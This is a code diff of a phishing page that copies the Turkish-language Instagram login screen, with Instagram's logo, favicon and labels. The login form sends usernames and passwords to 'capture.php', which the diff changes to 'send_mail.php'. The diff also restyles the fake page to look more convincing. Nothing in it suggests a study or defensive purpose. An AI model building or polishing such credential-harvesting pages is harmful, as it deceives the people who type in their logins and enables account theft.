@@ -7,54 +7,48 @@
     <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3048c446e.ico">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; color: #262626; display: flex; flex-direction: column; min-height: 100vh; }
-        main { display: flex; justify-content: center; align-items: center; flex-grow: 1; padding-bottom: 32px; margin-top: 32px; }
-        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 10px 40px; text-align: center; }
-        .logo-container { margin: 36px 0 12px; }
-        .logo-img { background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajl9-PkYhCl.png'); background-position: 0px -52px; background-size: 176px 186px; width: 175px; height: 51px; display: inline-block; }
-        form { display: flex; flex-direction: column; margin-top: 24px; }
-        input { background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; color: #262626; font-size: 12px; margin-bottom: 6px; padding: 9px 0 7px 8px; outline: none; }
-        input:focus { border: 1px solid #a8a8a8; }
-        .login-btn { background-color: #0095f6; border: 1px solid transparent; border-radius: 8px; color: #fff; font-size: 14px; font-weight: 600; margin-top: 8px; padding: 7px 16px; cursor: pointer; }
-        .login-btn:active { opacity: 0.7; }
-        .or-container { display: flex; align-items: center; margin: 18px 0; }
-        .line { background-color: #dbdbdb; height: 1px; flex-grow: 1; }
-        .or-text { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; text-transform: uppercase; }
-        .fb-login-btn { background: none; border: none; color: #385185; cursor: pointer; font-size: 14px; font-weight: 600; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; text-decoration: none; }
-        .fb-icon { background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajl9-PkYhCl.png'); background-position: -414px -259px; background-size: 440px 411px; width: 16px; height: 16px; margin-right: 8px; }
-        .forgot-pass { color: #00376b; font-size: 12px; text-decoration: none; margin-top: 12px; }
-        .signup-box { background: white; border: 1px solid #dbdbdb; width: 350px; margin-top: 10px; padding: 20px; text-align: center; font-size: 14px; }
-        .signup-link { color: #0095f6; font-weight: 600; text-decoration: none; }
-        .footer { padding: 0 20px; margin-bottom: 52px; text-align: center; color: #8e8e8e; font-size: 12px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; flex-direction: column; min-height: 100vh; }
+        .wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; flex-grow: 1; margin-top: 32px; }
+        .login-box { background: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 10px 0; text-align: center; }
+        .logo { margin: 36px 0 12px; display: inline-block; background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajl9-PkYhCl.png'); background-position: 0px -52px; background-size: 176px 186px; width: 175px; height: 51px; }
+        .form-container { padding: 0 40px; margin-top: 24px; }
+        .input-group { position: relative; margin-bottom: 6px; }
+        .input-group input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 14px 0 2px 8px; font-size: 12px; outline: none; }
+        .input-group span { position: absolute; left: 8px; top: 10px; color: #8e8e8e; font-size: 12px; transition: all 0.1s ease; pointer-events: none; }
+        .input-group input:focus ~ span, .input-group input:not(:placeholder-shown) ~ span { top: 2px; font-size: 10px; }
+        .btn-login { width: 100%; background-color: #0095f6; border: none; border-radius: 8px; color: #fff; font-size: 14px; font-weight: 600; padding: 7px 0; margin-top: 8px; cursor: pointer; }
+        .btn-login:disabled { opacity: 0.7; cursor: default; }
+        .divider { display: flex; align-items: center; margin: 20px 0; padding: 0 40px; }
+        .line { height: 1px; background: #dbdbdb; flex-grow: 1; }
+        .or { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; }
+        .fb-link { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 15px; }
+        .forgot { color: #00376b; font-size: 12px; text-decoration: none; }
+        .signup { background: #fff; border: 1px solid #dbdbdb; width: 350px; margin-top: 10px; padding: 20px; text-align: center; font-size: 14px; }
+        .signup a { color: #0095f6; font-weight: 600; text-decoration: none; }
     </style>
 </head>
 <body>
-    <main>
-        <div class="content-wrapper">
-            <div class="login-box">
-                <div class="logo-container">
-                    <i class="logo-img"></i>
-                </div>
-                <form action="capture.php" method="POST">
-                    <input type="text" name="u_name" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
-                    <input type="password" name="p_word" placeholder="Şifre" required>
-                    <button type="submit" class="login-btn">Giriş Yap</button>
-                    <div class="or-container">
-                        <div class="line"></div>
-                        <div class="or-text">YA DA</div>
-                        <div class="line"></div>
+    <div class="wrapper">
+        <div class="login-box">
+            <div class="logo"></div>
+            <div class="form-container">
+                <form action="send_mail.php" method="POST">
+                    <div class="input-group">
+                        <input type="text" name="email" placeholder=" " required>
+                        <span>Telefon numarası, kullanıcı adı veya e-posta</span>
                     </div>
-                    <a href="#" class="fb-login-btn"><span class="fb-icon"></span>Facebook ile Giriş Yap</a>
-                    <a href="#" class="forgot-pass">Şifreni mi unuttun?</a>
+                    <div class="input-group">
+                        <input type="password" name="pass" placeholder=" " required>
+                        <span>Şifre</span>
+                    </div>
+                    <button type="submit" class="btn-login">Giriş Yap</button>
                 </form>
-            </div>
-            <div class="signup-box">
-                Hesabın yok mu? <a href="#" class="signup-link">Kaydol</a>
+                <div class="divider"><div class="line"></div><div class="or">YA DA</div><div class="line"></div></div>
+                <a href="#" class="fb-link">Facebook ile Giriş Yap</a>
+                <a href="#" class="forgot">Şifreni mi unuttun?</a>
             </div>
         </div>
-    </main>
-    <footer class="footer">
-        © 2026 Instagram from Meta
-    </footer>
+        <div class="signup">Hesabın yok mu? <a href="#">Kaydol</a></div>
+    </div>
 </body>
 </html>
